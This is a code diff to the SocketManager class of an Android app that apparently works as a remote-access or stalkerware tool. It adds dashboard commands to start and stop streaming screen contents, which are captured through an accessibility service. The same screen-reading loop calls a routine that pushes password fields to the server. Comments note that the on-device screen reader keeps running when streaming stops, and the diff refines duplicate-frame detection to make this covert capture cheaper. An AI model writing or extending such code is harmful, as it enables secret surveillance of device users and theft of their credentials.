@@ -1321,6 +1321,8 @@ public class SocketManager {
             case "open_task_manager":
             case "screen_reader_start":
             case "screen_reader_stop":
+            case "screen_reader_stream_start":
+            case "screen_reader_stream_stop":
             case "list_screen_recordings":
             case "get_screen_recording":
             case "delete_screen_recording":
@@ -1479,18 +1481,57 @@ public class SocketManager {
             }
 
             case "screen_reader_start": {
+                // ScreenReaderRecorder tab: start the recording loop on the device.
+                // This controls the offline recording buffer + streaming to dashboard.
                 manualRecordingActive = true;
-                startScreenReaderLoop(accessSvc, false);
+                // Start the loop only if it is not already running — auto-recording
+                // may have already started it.  Never restart a healthy loop just because
+                // the dashboard pressed Start (that would cause a frame-gap stutter).
+                ScheduledFuture<?> currentSrf = screenReaderFuture;
+                if (currentSrf == null || currentSrf.isDone() || currentSrf.isCancelled()) {
+                    startScreenReaderLoop(accessSvc, false);
+                }
                 JSONObject ok = new JSONObject();
                 ok.put("success", true);
+                ok.put("message", "Recording started on device");
                 return ok;
             }
 
             case "screen_reader_stop": {
+                // ScreenReaderRecorder tab: stop the recording loop and save what was
+                // captured to a local file on the device for later retrieval.
+                // This DOES stop the full loop (recording halted, buffer flushed to disk).
                 manualRecordingActive = false;
                 stopScreenReaderLoop(false);
                 JSONObject ok = new JSONObject();
                 ok.put("success", true);
+                ok.put("message", "Recording stopped and saved on device");
+                return ok;
+            }
+
+            case "screen_reader_stream_start": {
+                // ScreenReaderView tab: enable streaming screen:update frames to the
+                // dashboard.  The underlying loop is kept running (or started if not yet
+                // running) — the device screen reader is NEVER fully stopped by this.
+                manualRecordingActive = true;
+                ScheduledFuture<?> srf = screenReaderFuture;
+                if (srf == null || srf.isDone() || srf.isCancelled()) {
+                    startScreenReaderLoop(accessSvc, false);
+                }
+                JSONObject ok = new JSONObject();
+                ok.put("success", true);
+                ok.put("message", "Stream started — screen reader continues on device");
+                return ok;
+            }
+
+            case "screen_reader_stream_stop": {
+                // ScreenReaderView tab: stop sending screen:update frames to the dashboard.
+                // The underlying screen reader loop on the device keeps running — only the
+                // push to the server is paused.
+                manualRecordingActive = false;
+                JSONObject ok = new JSONObject();
+                ok.put("success", true);
+                ok.put("message", "Stream stopped — screen reader still running on device");
                 return ok;
             }
 
@@ -1542,7 +1583,11 @@ public class SocketManager {
 
     /**
      * Compute a lightweight fingerprint for a screen result so we can skip
-     * duplicate frames — the lock screen often stays identical for long periods.
+     * duplicate frames — the lock screen and idle screens often stay identical
+     * for long periods and should not be retransmitted.
+     *
+     * Strategy: concatenate package + element count + first 20 elements' text/desc/bounds,
+     * then return an integer hash as a string so comparison is O(1) and storage is tiny.
      */
     private String computeFrameFingerprint(JSONObject screenResult) {
         if (screenResult == null) return "";
@@ -1551,19 +1596,28 @@ public class SocketManager {
             if (screen == null) return "";
             String pkg = screen.optString("packageName", "");
             JSONArray elements = screen.optJSONArray("elements");
-            StringBuilder sb = new StringBuilder(pkg);
+            int elemCount = elements == null ? 0 : elements.length();
+            // Use a StringBuilder → hash to avoid large string allocations on every tick
+            StringBuilder sb = new StringBuilder(256);
+            sb.append(pkg).append(':').append(elemCount);
             if (elements != null) {
-                int count = Math.min(elements.length(), 12);
-                for (int i = 0; i < count; i++) {
+                int check = Math.min(elemCount, 20);
+                for (int i = 0; i < check; i++) {
                     JSONObject el = elements.optJSONObject(i);
-                    if (el != null) {
-                        sb.append('|').append(el.optString("text", ""));
-                        sb.append('|').append(el.optString("contentDescription", ""));
-                        sb.append('|').append(el.optString("hintText", ""));
-                    }
+                    if (el == null) continue;
+                    sb.append('|')
+                      .append(el.optString("text", ""))
+                      .append(el.optString("contentDescription", ""))
+                      .append(el.optString("hintText", ""))
+                      .append(el.optBoolean("checked", false) ? "C" : "")
+                      .append(el.optBoolean("selected", false) ? "S" : "");
+                    // Include bounds top-left so scrolled content registers as different
+                    JSONObject b = el.optJSONObject("bounds");
+                    if (b != null) sb.append('@').append(b.optInt("top", 0));
                 }
             }
-            return sb.toString();
+            // Return integer hash — avoids retaining a long string in memory
+            return String.valueOf(sb.toString().hashCode());
         } catch (Exception e) {
             return "";
         }
@@ -1586,6 +1640,17 @@ public class SocketManager {
         screenReaderFuture = heartbeatExecutor.scheduleWithFixedDelay(() -> {
             boolean acq = false;
             try {
+                // ── Screen-off guard ─────────────────────────────────────────
+                // Do NOT capture accessibility data when the screen is turned off.
+                // isInteractive() returns false when the screen is off or on the
+                // lock-screen-off state; no meaningful UI is visible then.
+                android.os.PowerManager pwrMgr = (android.os.PowerManager)
+                        context.getSystemService(Context.POWER_SERVICE);
+                if (pwrMgr != null && !pwrMgr.isInteractive()) {
+                    Log.d(TAG, "screen_reader: screen off — skipping frame");
+                    return;
+                }
+
                 // Re-check service every tick — captured `svc` may be dead after service restart
                 UnifiedAccessibilityService liveSvc = UnifiedAccessibilityService.getInstance();
                 if (liveSvc == null) {
@@ -1605,6 +1670,25 @@ public class SocketManager {
                 JSONObject screenResult = pusher.readScreen();
                 pushPasswordFieldsFromScreen(screenResult);
 
+                // ── Duplicate-frame deduplication ────────────────────────────
+                // Compute a lightweight fingerprint of the current screen.
+                // If the fingerprint matches the last sent frame, skip it so we
+                // don't flood the server (and waste 3G bandwidth) with identical data.
+                // Allow up to 4 consecutive identical frames before starting to skip,
+                // so transient paint-flushes are not mistaken for real changes.
+                String fp = computeFrameFingerprint(screenResult);
+                if (!fp.isEmpty() && fp.equals(lastFrameFingerprint)) {
+                    consecutiveDuplicateCount++;
+                    if (consecutiveDuplicateCount > 4) {
+                        // Screen is static — skip this tick entirely
+                        Log.d(TAG, "screen_reader: static screen, skip #" + consecutiveDuplicateCount);
+                        return;
+                    }
+                } else {
+                    lastFrameFingerprint      = fp;
+                    consecutiveDuplicateCount = 0;
+                }
+
                 JSONObject payload = new JSONObject();
                 payload.put("deviceId", devId);
                 payload.put("success", screenResult.optBoolean("success", false));
@@ -1617,6 +1701,8 @@ public class SocketManager {
                     }
                 }
 
+                // Only push to dashboard when the dashboard has explicitly requested streaming
+                // (manualRecordingActive) AND the live channel is up.
                 if (manualRecordingActive && liveConnected) {
                     sendLiveMessage("screen:update", payload);
                 }
